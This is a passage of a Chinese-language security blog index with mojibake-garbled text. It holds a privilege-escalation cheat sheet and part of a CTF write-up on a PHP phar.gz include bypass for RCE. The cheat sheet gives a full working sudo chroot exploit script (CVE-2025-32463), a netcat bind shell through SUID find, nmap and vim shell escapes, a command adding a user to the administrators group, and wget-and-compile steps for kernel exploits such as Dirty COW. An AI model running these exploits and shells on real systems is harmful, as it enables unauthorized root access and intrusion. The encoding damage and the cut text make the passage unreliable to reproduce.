såŸºç¡€å‘½ä»¤\nwhoami\nå’Œlinuxä¸­çš„ä¸€æ ·ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™\n\n\nsysteminfo\næŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ä¸è¡¥ä¸ä¿¡æ¯ï¼ˆåˆ©ç”¨ç³»ç»Ÿè¾ƒè€ï¼Œæ²¡æœ‰æ‰“å¯¹åº”è¡¥ä¸æ¥è¿›è¡Œææƒï¼‰\n\n\nver\næŸ¥çœ‹å½“å‰æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬\n\n\nNet start\næŸ¥çœ‹å½“å‰è®¡ç®—æœºå¼€å¯æœåŠ¡åç§°\n\n\nnet user username(ç”¨æˆ·å) password(å¯†ç ) /addï¼Œnet localgroup adminstrators username /add\nå…ˆæ·»åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œå†æŠŠè¿™ä¸ªç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç”¨æˆ·çš„ç»„ä¸­\n\nnetstat -ano\næŸ¥çœ‹ç«¯å£æƒ…å†µ\n\n\ntasklist\næŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹å ç”¨çš„ç«¯å£\n\n\n\nLinuxåŸºç¡€å‘½ä»¤å†…æ ¸ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¾å¤‡ä¿¡æ¯uname -a    æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯uname -r    å†…æ ¸ç‰ˆæœ¬uname -n    ç³»ç»Ÿä¸»æœºåã€‚uname -m    æŸ¥çœ‹ç³»ç»Ÿå†…æ ¸æ¶æ„ï¼ˆ64ä½/32ä½ï¼‰hostname    ç³»ç»Ÿä¸»æœºåcat /proc/version    å†…æ ¸ä¿¡æ¯cat /etc/*-release   åˆ†å‘ä¿¡æ¯cat /etc/issue       åˆ†å‘ä¿¡æ¯cat /proc/cpuinfo    CPUä¿¡æ¯cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-\n\n\nåˆ©ç”¨/proc/versionå¯ä»¥ç›®æ ‡ç³»ç»Ÿä¿¡æ¯ï¼ˆå’Œuname -aç±»ä¼¼ï¼‰\n\nhostnameå‘½ä»¤å¯ä»¥æŸ¥çœ‹ä¸»æœºåï¼Œé€šå¸¸å¯ä»¥æä¾›å…³äºä¸»æœºåœ¨åŸŸä¸­çš„è§’è‰²ä¿¡æ¯\n\nç”¨æˆ·å’Œç¾¤ç»„cat /etc/passwd     åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç»„grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;      åˆ—å‡ºæ‰€æœ‰çš„è¶…çº§ç”¨æˆ·è´¦æˆ·whoami              æŸ¥çœ‹å½“å‰ç”¨æˆ·w                   è°ç›®å‰å·²ç™»å½•ï¼Œä»–ä»¬æ­£åœ¨åšä»€ä¹ˆlast                æœ€åç™»å½•ç”¨æˆ·çš„åˆ—è¡¨lastlog             æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯lastlog â€“u %username%  æœ‰å…³æŒ‡å®šç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯lastlog |grep -v &quot;Never&quot;  ä»¥å‰ç™»å½•ç”¨æˆ·çš„å®Œ\n\n/etc/passwdæ–‡ä»¶å†…æ˜¾ç¤ºäº†æ‰€æœ‰ç³»ç»Ÿç”¨æˆ·ï¼Œåœ¨ç³»ç»Ÿä¸­è¢«ä½¿ç”¨çš„ç”¨æˆ·å¯ä»¥åœ¨/homeä¸­æ‰¾åˆ°\n\nç”¨æˆ·æƒé™ä¿¡æ¯whoami        å½“å‰ç”¨æˆ·åid            å½“å‰ç”¨æˆ·ä¿¡æ¯cat /etc/sudoers  è°è¢«å…è®¸ä»¥rootèº«ä»½æ‰§è¡Œsudo -l       å½“å‰ç”¨æˆ·å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œæ“ä½œ\n\nç¯å¢ƒä¿¡æ¯env        æ˜¾ç¤ºç¯å¢ƒå˜é‡set        è®¾ç½®setçš„æ‰§è¡Œæ–¹å¼$PATH è·¯å¾„ä¿¡æ¯history    æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½•pwd        è¾“å‡ºå·¥ä½œç›®å½•cat /etc/profile   æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿå˜é‡cat /etc/shells    æ˜¾ç¤ºå¯ç”¨çš„shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout\n\nenvå‘½ä»¤æ˜¾ç¤ºç¯å¢ƒå˜é‡\n\nhistoryå‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰ç»ˆç«¯çš„å†å²æ‰§è¡Œå‘½ä»¤\n\nPATHå˜é‡é€šå¸¸å¯ä»¥çœ‹åˆ°ç¼–è¯‘å™¨æˆ–è€…è„šæœ¬è¯­è¨€çš„ä¿¡æ¯\nè¿›ç¨‹å’ŒæœåŠ¡ps auxps -eftopcat /etc/servicesæŸ¥çœ‹ä»¥root è¿è¡Œçš„è¿›ç¨‹ï¼šps aux | grep rootps -ef | grep root\n\npså‘½ä»¤é€šå¸¸è¢«ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿè¿è¡Œçš„è¿›ç¨‹ã€‚\n\nï¼ˆè¿›ç¨‹çŠ¶æ€ï¼‰çš„è¾“å‡º\nå°†æ˜¾ç¤ºä»¥ä¸‹å†…å®¹ï¼›\n\nPIDï¼šè¿›ç¨‹IDï¼ˆè¿›ç¨‹å”¯ä¸€ï¼‰\nTTYï¼šç”¨æˆ·ä½¿ç”¨çš„ç»ˆç«¯ç±»å‹\næ—¶é—´ï¼šè¿›ç¨‹ä½¿ç”¨çš„ CPU æ—¶é—´é‡ï¼ˆè¿™ä¸æ˜¯è¯¥è¿›ç¨‹è¿è¡Œçš„æ—¶é—´ï¼‰\nCMDï¼šæ­£åœ¨è¿è¡Œçš„å‘½ä»¤æˆ–å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆä¸ä¼šæ˜¾ç¤ºä»»ä½•å‘½ä»¤è¡Œå‚æ•°ï¼‰\n\n\n\næŸ¥çœ‹å®‰è£…çš„è½¯ä»¶ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l\n\næœåŠ¡&#x2F;æ’ä»¶æ£€æŸ¥æœ‰æ²¡æœ‰ä¸å®‰å…¨çš„æœåŠ¡é…ç½®ï¼Œå’Œä¸€äº›æœ‰æ¼æ´çš„æ’ä»¶ã€‚\ncat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#x27;$1 ~ /^.*r.*/\n\nè®¡åˆ’ä»»åŠ¡crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root\n\næœ‰æ— æ˜æ–‡å­˜æ”¾ç”¨æˆ·å¯†ç grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;\n\næŸ¥çœ‹ä¸å½“å‰æœºå™¨é€šä¿¡çš„å…¶ä»–ç”¨æˆ·æˆ–è€…ä¸»æœºlsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw\n\nnetstatå¯ä»¥æŸ¥çœ‹ç°æœ‰çš„è¿æ¥ä¿¡æ¯\n\nåˆ©ç”¨netstat -atå’Œnetstat -auå¯ä»¥åˆ†åˆ«æ˜¾ç¤ºtcpå’Œudpåè®®çš„è¿æ¥\nåˆ©ç”¨netstat -lå¯ä»¥ä»¥Listenåˆ—å‡ºç«¯å£\n\n\næ—¥å¿—æ–‡ä»¶cat /var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp\n\näº¤äº’å¼shellpython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;echo os.system(&#x27;/bin/bash&#x27;)/bin/sh -i\n\nå¯ææƒSUID &amp;&amp; GUIDfind / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done    # Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \\; 2&gt;/dev/null\n\næŸ¥çœ‹å¯å†™&#x2F;æ‰§è¡Œç›®å½•find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders\n\nLinuxææƒæ–¹æ³•sudo chwootCVE-2025-32463ï¼šå½±å“ç‰ˆæœ¬1.9.14 &lt;&#x3D; sudo &lt;&#x3D; 1.9.17\nåœ¨é¶æœºä¸­è¿è¡Œæ­¤shè„šæœ¬å³å¯è·å–rootæƒé™(è¿è¡Œçš„æ—¶å€™æŠŠä»£ç æ—è¾¹çš„æ³¨é‡Šå»æ‰)\n#!/bin/bash# sudo-chwoot.sh# CVE-2025-32463 â€“ Sudo EoP Exploit PoC by Rich Mirch#                  @ Stratascale Cyber Research Unit (CRU)STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)             cd $&#123;STAGE?&#125; || exit 1                                    cat &gt; woot1337.c&lt;&lt;EOF                                     #include &lt;stdlib.h&gt;   #include &lt;unistd.h&gt;__attribute__((constructor)) void woot(void) &#123;  setreuid(0,0);                                            setregid(0,0);  chdir(&quot;/&quot;);                                              execl(&quot;/bin/bash&quot;, &quot;/bin/bash&quot;, NULL);                  &#125;EOFmkdir -p woot/etc libnss_echo &quot;passwd: /woot1337&quot; &gt; woot/etc/nsswitch.confcp /etc/group woot/etcgcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.cecho &quot;woot!&quot;sudo -R woot wootrm -rf $&#123;STAGE?&#125;\n\nSUID ææƒä»€ä¹ˆæ˜¯suidææƒ\nsuidå…¨ç§°æ˜¯Set owner User ID up on executionã€‚è¿™æ˜¯Linuxç»™å¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€ä¸ªå±æ€§ã€‚é€šä¿—çš„ç†è§£ä¸ºå…¶ä»–ç”¨æˆ·æ‰§è¡Œè¿™ä¸ªç¨‹åºçš„æ—¶å€™å¯ä»¥ç”¨è¯¥ç¨‹åºæ‰€æœ‰è€…&#x2F;ç»„çš„æƒé™ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰ç¨‹åºçš„æ‰€æœ‰è€…æ˜¯0å·æˆ–å…¶ä»–super userï¼ŒåŒæ—¶æ‹¥æœ‰suidæƒé™ï¼Œæ‰å¯ä»¥ææƒã€‚\nå¸¸è§çš„å¯ç”¨æ¥ææƒçš„Linux å¯æ‰§è¡Œæ–‡ä»¶æœ‰ï¼šNmap, Vim, find, bash, more, less, nano, cp\næŸ¥çœ‹å¯ä»¥suid ææƒçš„å¯æ‰§è¡Œæ–‡ä»¶\nfind / -perm -u=s -type f 2&gt;/dev/null\n\n\nfindå®ç”¨ç¨‹åºfindç”¨æ¥åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œ(å¯¹ç³»ç»Ÿç‰ˆæœ¬æœ‰è¦æ±‚)\næ¯”å¦‚ï¼šDC -1 é¶æœºå°±æ˜¯åˆ©ç”¨find å‘½ä»¤è¿›è¡Œroot ç”¨æˆ·æ¥æ‰§è¡Œå‘½ä»¤\n\nå¤§éƒ¨åˆ†Linux ç³»ç»Ÿéƒ½å®‰è£…äº†ncã€‚ä½¿ç”¨find aaa - exec netcat -lvp 5555 -e /bin/sh \\; å³å¯æˆåŠŸåå¼¹root shell\nnmapæ—©æœŸnmap å…·æœ‰äº¤äº’æ¨¡å¼ï¼Œversion 2.02ï½5.21ï¼ˆ5.2.0ï¼‰ã€‚\nnmap --interactive!sh\n\n\næ¼æ´æ£€æµ‹å·¥å…·Metasploitå°±å­˜åœ¨åˆ©ç”¨ SUID nmap ææƒçš„expï¼Œè¿™é‡Œä¸ç»†è®²\nåœ¨nmap5.2.0ä¹‹åï¼Œnmapè¿˜å¯ä»¥é€šè¿‡æ‰§è¡Œè„šæœ¬æ¥ææƒ\necho &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getshellsudo nmap --script=getshell\n\nå‚è€ƒDC 6 é¶æœº:https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83\nvimå¦‚æœvim æ˜¯é€šè¿‡SUIDè¿è¡Œï¼Œå°±ä¼šç»§æ‰¿rootç”¨æˆ·çš„æƒé™ã€‚å¯è¯»å–åªæœ‰rootèƒ½è¯»å–çš„æ–‡ä»¶ã€‚\nvim /etc/passwd\n\nvim è¿è¡Œshell:\nvim:set shell=/bin/sh:shell\n\nåŒç†ï¼Œæ»¡è¶³æ¡ä»¶çš„lesså’Œmoreä¹Ÿèƒ½ææƒ\n###åˆ©ç”¨å†…æ ¸æ¼æ´\næ¯”å¦‚DC 3 é¶æœºï¼Œå°±æ˜¯åˆ©ç”¨ç³»ç»Ÿå†…æ ¸æ¼æ´æ¥è¿›è¡Œææƒ\nåœ¨kaliä¸­è·å–exp:\nsearchsploit Ubuntu 16.04\n\n\næ ¹æ®è¯´æ˜æ–‡ä»¶ï¼ŒæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤ä¸€æ­¥æ­¥è¿è¡Œ\nwget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O 39772.zipunzip 39772.ziptar xvf 39772/exploit.tarsudo apt install libfuse-dev pkg-config gcc makecd ebpf_mapfd_doubleput_exploitchmod +x compile.sh./compile.sh./doubleput\n\nè¿˜æœ‰å¤§åé¼é¼çš„CVE-2016-5195ï¼Œè„ç‰›æ¼æ´\nexpé“¾æ¥ï¼šhttps://github.com/FireFart/dirtycow\n\nå°†expä¸‹è½½åˆ°æœ¬åœ°\nwget https://github.com/FireFart/dirtycow\n\nä½¿ç”¨gcc -pthread dirty.c -o dirty -lcryptå‘½ä»¤å¯¹dirty.cè¿›è¡Œç¼–è¯‘ï¼Œç”Ÿæˆä¸€ä¸ªdirtyçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚\n\n\n\n\næ‰§è¡Œ./dirty å¯†ç å‘½ä»¤ï¼Œå³å¯è¿›è¡Œææƒ\n\n\nä½¿ç”¨æä¾›çš„è´¦å·å¯†ç å³å¯ææƒ\nsu firefart\n\nå…¶ä»–å†…æ ¸æ¼æ´ï¼š\nLinux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04) â€“ â€˜overlayfsâ€™ Local Root Shell\nhttps://www.exploit-db.com/exploits/37292/\nLinux Kernel 4.3.3 (Ubuntu 14.04&#x2F;15.10) â€“ â€˜overlayfsâ€™ Local Root Exploit\nhttps://www.exploit-db.com/exploits/39166/\nLinux Kernel 4.3.3 â€“ â€˜overlayfsâ€™ Local Privilege Escalation\nhttps://www.exploit-db.com/exploits/39230/\n\næç¤ºï¼šå†…æ ¸exploitææƒæœ‰é£é™©ï¼Œæœ‰å¯èƒ½ä¼šå´©æºƒç³»ç»Ÿã€‚\n\nåˆ©ç”¨rootæ— å¯†ç æ‰§è¡Œ","categories":["ææƒ"],"tags":["ææƒ"]},{"title":"æœ€æ–°æœ€çƒ­phar.gz","url":"/2025/09/18/%E6%9C%80%E6%96%B0%E6%9C%80%E7%83%ADphar-gz/","content":"å‰è¨€åœ¨ä¹‹å‰çš„æ¹¾åŒºæ¯å’Œå›½é™…èµ›ä¸­å‡ºç°äº†pharååºåˆ—åŒ–é…åˆæ–‡ä»¶ä¸Šä¼ è¿›è¡Œrceçš„æ“ä½œ,å¯¹å…¶å­¦ä¹ çš„åŒæ—¶, å‘ç°äº†ä¸€ä¸ªæ¯”è¾ƒä¸é”™çš„å§¿åŠ¿, å®ƒå¯ä»¥åŒ…å«æ–‡ä»¶å†…å®¹æ²¡æœ‰ php ä»£ç çš„æ–‡ä»¶, ä½†æ˜¯èƒ½å¤Ÿè¿›è¡Œä»£ç æ‰§è¡Œ, å¹¶ä¸”å¯¹æ–‡ä»¶åç§°æ¯«æ— è¦æ±‚..(åŸºäº ..&#x2F; è·³ç›®å½•çš„å§¿åŠ¿)\nè¿‡ç¨‹åˆ†æå…ˆæ¥ä¸ªä¾‹é¢˜,DeadsecCTF2025 baby-web\nç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªphpæ–‡ä»¶åŒ…å«çš„trickï¼Œå½“ä¸Šä¼ æ–‡ä»¶é€»è¾‘åˆ¤æ–­æŠŠèƒ½å¤Ÿå†™é©¬çš„å…³é”®è¯å…¨éƒ¨banäº†ï¼Œè¿™ä¸ªæ—¶å€™æ€ä¹ˆæ‰èƒ½å†™é©¬ä¸Šä¼ \næºç å¦‚ä¸‹:\n&lt;?phpsession_start();error_reporting(0);if (!isset($_SESSION[&#x27;dir&#x27;])) &#123;    $_SESSION[&#x27;dir&#x27;] = random_bytes(4);&#125;if (!isset($_GET[&#x27;url&#x27;])) &#123;    die(&quot;Nope :&lt;&quot;);&#125;$include_url = basename($_GET[&#x27;url&#x27;]);$SANDBOX = getcwd() . &quot;/uploads/&quot; . md5(&quot;supersafesalt!!!!@#$&quot; . $_SESSION[&#x27;dir&#x27;]);if (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if (!file_exists($SANDBOX . &#x27;/&#x27; . $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;if (!preg_match(&quot;/\\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;@include($SANDBOX . &#x27;/&#x27; . $include_url);?&gt;\n\n&lt;?phpsession_start();error_reporting(0);$allowed_extensions = [&#x27;zip&#x27;, &#x27;bz2&#x27;, &#x27;gz&#x27;, &#x27;xz&#x27;, &#x27;7z&#x27;];$allowed_mime_types = [    &#x27;application/zip&#x27;,    &#x27;application/x-bzip2&#x27;,    &#x27;application/gzip&#x27;,    &#x27;application/x-gzip&#x27;,    &#x27;application/x-xz&#x27;,    &#x27;application/x-7z-compressed&#x27;,];function filter($tempfile)&#123;    $data = file_get_contents($tempfile);    if (        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false    ) &#123;        return true;    &#125;    return false;&#125;if (!isset($_SESSION[&#x27;dir&#x27;])) &#123;    $_SESSION[&#x27;dir&#x27;] = random_bytes(4);&#125;$SANDBOX = getcwd() . &quot;/uploads/&quot; . md5(&quot;supersafesalt!!!!@#$&quot; . $_SESSION[&#x27;dir&#x27;]);if (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &#x27;POST&#x27;) &#123;    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;        if (filter($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;])) &#123;            die(&quot;Nope :&lt;&quot;);        &#125;        // mimetype check        $finfo = finfo_open(FILEINFO_MIME_TYPE);        $mime_type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);        finfo_close($finfo);        if (!in_array($mime_type, $allowed_mime_types)) &#123;            die(&#x27;Nope :&lt;&#x27;);        &#125;        // ext check        $ext = strtolower(pathinfo(basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]), PATHINFO_EXTENSION));        if (!in_array($ext, $allowed_extensions)) &#123;            die(&#x27;Nope :&lt;&#x27;);        &#125;        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &quot;$SANDBOX/&quot; . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))) &#123;            echo &quot;File upload success!&quot;;        &#125;    &#125;&#125;?&gt;&lt;form enctype=&#x27;multipart/form-data&#x27; action=&#x27;upload.php&#x27; method=&#x27;post&#x27;&gt;    &lt;input type=&#x27;file&#x27; name=&#x27;file&#x27;&gt;    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/p&gt;&lt;/form&gt;\n\nç¬¬ä¸€ä¸ªéƒ¨åˆ†æ˜¯æ–‡ä»¶åŒ…å«,ç¬¬äºŒä¸ªéƒ¨åˆ†æ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚æ–‡ä»¶åŒ…å«çš„éƒ¨åˆ†å®Œå…¨æ²¡æœ‰å¯æ§ç‚¹ï¼Œå› ä¸ºä½¿ç”¨çš„basenameã€‚\nåŒç†ï¼Œæ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†ä¹Ÿå®Œå…¨æ²¡æœ‰åŠæ³•ç»•è¿‡ã€‚é¦–å…ˆå› ä¸ºæ˜¯ä¸ªç™½åå•ï¼Œå®Œå…¨æ²¡æœ‰åˆ©ç”¨ç—•è¿¹\nå…¶æ¬¡ï¼Œå¯¹æ–‡ä»¶çš„å†…å®¹åšäº†é™åˆ¶ï¼š\nfunction filter($tempfile)&#123;    $data = file_get_contents($tempfile);    if (        stripos($data, &quot;__HALT_COMPILER();&quot;) !== false || stripos($data, &quot;PK&quot;) !== false ||        stripos($data, &quot;&lt;?&quot;) !== false || stripos(strtolower($data), &quot;&lt;?php&quot;) !== false    ) &#123;        return true;    &#125;    return false;&#125;\n\næ–‡ä»¶é‡Œçš„å†…å®¹ä¸èƒ½åŒ…å«__HALT_COMPILER();,PK,&lt;?,&lt;?php\n&lt;?, &lt;?phpï¼šPHP ä»£ç ç‰‡æ®µ__HALT_COMPILER();:PHP ç‰¹æ®Šå‡½æ•°ï¼Œ pharåˆ©ç”¨\n\nç„¶åå†çœ‹çœ‹æ–‡ä»¶åŒ…å«çš„é™åˆ¶\nç›®å½•ç©¿è¶Šä¸è€ƒè™‘ï¼Œå› ä¸ºç”¨çš„æ˜¯basename\nif (!file_exists($SANDBOX)) &#123;    mkdir($SANDBOX);&#125;if (!file_exists($SANDBOX . &#x27;/&#x27; . $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;if (!preg_match(&quot;/\\.(zip|bz2|gz|xz|7z)/i&quot;, $include_url)) &#123;    die(&quot;Nope :&lt;&quot;);&#125;\n\næ²™ç®±ç›®å½•å­˜åœ¨ï¼›\næ–‡ä»¶å­˜åœ¨ï¼›\næ–‡ä»¶æ‰©å±•åå¿…é¡»æ˜¯ zip &#x2F; bz2 &#x2F; gz &#x2F; xz &#x2F; 7z\nç»•è¿‡è§£è¯»+æ—  php ä»£ç  RCEæˆ‘ä»¬å…ˆç»™å‡ºç»•è¿‡çš„æ–¹æ³•ï¼Œä¸‹é¢è¿›è¡Œåˆ†æï¼Œè¿™æ ·æ›´å®¹æ˜“æ˜ç™½è¿™ä¸ªæ¼æ´çš„å·§å¦™ä¹‹å¤„\né¦–å…ˆåˆ¶ä½œä¸€ä¸ª pharçš„æ–‡ä»¶\n&lt;?php$phar = new Phar(&#x27;test.phar&#x27;);$phar-&gt;startBuffering();$stub = &lt;&lt;&lt;&#x27;STUB&#x27;\t&lt;?php\tsystem(&#x27;whoami&#x27;);\t__HALT_COMPILER();\t?&gt;\tSTUB;$phar-&gt;setStub($stub);$phar-&gt;stopBuffering();?&gt;\n\néœ€è¦åœ¨php.inié‡Œæ”¹æ‰phar.readonly &#x3D; Off\næˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹æ²¡æœ‰å‹ç¼©è¿‡çš„pharæ–‡ä»¶çš„å†…å®¹\n\nå¯ä»¥çœ‹åˆ°,è¿˜æ˜¯æœ‰ä¸Šé¢çš„è¿‡æ»¤å­—ç¬¦,è¿™æ ·è‚¯å®šæ˜¯è¿‡ä¸äº†wafçš„,å†æ¥å¯¹è¿™ä¸ªpharæ–‡ä»¶è¿›è¡Œgzipå‹ç¼©\ngzip -c test.phar &gt; test.phar.gz\n\n\nå†æ¬¡æŸ¥çœ‹å¾—åˆ°çš„phar.gzæ–‡ä»¶,å‘ç°å·²ç»æ²¡æœ‰å±é™©å­—ç¬¦\næ­¤åˆ»å®é™…ä¸Štest.phar.gzæ–‡ä»¶ä¸­ä¸å«&lt;?phpç­‰æ•æ„Ÿå…³é”®å­—, å³å¯ RCE\nå‰æåˆ™æ˜¯è¢«åŒ…å«çš„æ–‡ä»¶å†…å®¹å¿…é¡»å­˜åœ¨.pharå…³é”®å­—æ‰è¡Œ.\nåŸå› åˆ†æå¯¹pharæ–‡ä»¶çš„å¤„ç†\nstatic zend_op_array *phar_compile_file(zend_file_handle *file_handle, int type) /* &#123;&#123;&#123; */&#123;    zend_op_array *res;    char *name = NULL;    int failed;    phar_archive_data *phar;    if (!file_handle || !file_handle-&gt;filename) &#123;        return phar_orig_compile_file(file_handle, type);    &#125;    if (strstr(file_handle-&gt;filename, &quot;.phar&quot;) &amp;&amp; !strstr(file_handle-&gt;filename, &quot;://&quot;)) &#123;        if (SUCCESS == phar_open_from_filename((char*)file_handle-&gt;filename, strlen(file_handle-&gt;filename), NULL, 0, 0, &amp;phar, NULL)) &#123;            if (phar-&gt;is_zip || phar-&gt;is_tar) &#123;                zend_file_handle f = *file_handle;                /* zip or tar-based phar */                spprintf(&amp;name, 4096, &quot;phar://%s/%s&quot;, file_handle-&gt;filename, &quot;.phar/stub.php&quot;);                if (SUCCESS == phar_orig_zend_open((const char *)name, &amp;f)) &#123;                    efree(name);                    name = NULL;                    f.filename = file_handle-&gt;filename;                    if (f.opened_path) &#123;                        efree(f.opened_path);                    &#125;                    f.opened_path = file_handle-&gt;opened_path;                    f.free_filename = file_handle-&gt;free_filename;                    switch (file_handle-&gt;type) &#123;                        case ZEND_HANDLE_STREAM:                            if (file_handle-&gt;handle.stream.closer &amp;&amp; file_handle-&gt;handle.stream.handle) &#123;                                file_handle-&gt;handle.stream.closer(file_handle-&gt;handle.stream.handle);                            &#125;                            file_handle-&gt;handle.stream.handle = NULL;                            break;                        default:                            break;                    &#125;                    *file_handle = f;                &#125;            &#125; else if (phar-&gt;flags &amp; PHAR_FILE_COMPRESSION_MASK) &#123;                zend_file_handle_dtor(file_handle);                /* compressed phar */                file_handle-&gt;type = ZEND_HANDLE_STREAM;                /* we do our own reading directly from the phar, don&#x27;t change the next line */                